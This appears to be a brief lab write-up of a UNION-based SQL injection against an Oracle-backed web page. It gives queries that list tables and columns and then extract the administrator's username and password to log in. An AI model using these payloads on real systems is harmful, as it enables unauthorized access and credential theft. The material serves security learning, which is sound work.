We see a vulnerbale webpage where we perform SQL Injection attack to list the contents on Oracle

![image](https://user-images.githubusercontent.com/65653010/235329927-cca02d81-7eaf-48ea-93af-b6a5795f5a63.png)


![image](https://user-images.githubusercontent.com/65653010/235329967-689ed978-599d-4dbb-bbe1-7b0172f89759.png)

Now we perform a query to get the table

SELECT * FROM someTable WHERE category='Gifts' UNION SELECT table_name, null from all_tables--'`

![image](https://user-images.githubusercontent.com/65653010/235330021-edaac355-cf15-45ad-8022-bd3cb22f0c33.png)

Now we perform a query to retrieve the columns of the users table

SELECT * FROM someTable WHERE category='Gifts' UNION SELECT column_name, null from all_tab_columns WHERE table_name = ''

![image](https://user-images.githubusercontent.com/65653010/235330184-4ec57556-6bcb-4358-abf4-7de1b725e7e5.png)

![image](https://user-images.githubusercontent.com/65653010/235330165-8c728f0e-b732-4040-ac07-fe612063bccb.png)

Now we perform this query to get the username and password the administrator

SELECT * FROM someTable WHERE category='X' UNION SELECT (username column), (password column) from (users table)--'

![image](https://user-images.githubusercontent.com/65653010/235330282-2448cb8e-5203-4c21-bb2c-f79fc7783318.png)

From the information we get username and password of administrator, we login into account

![image](https://user-images.githubusercontent.com/65653010/235330296-f13b1f95-88f1-4c12-b4e9-6c887b49ec31.png)

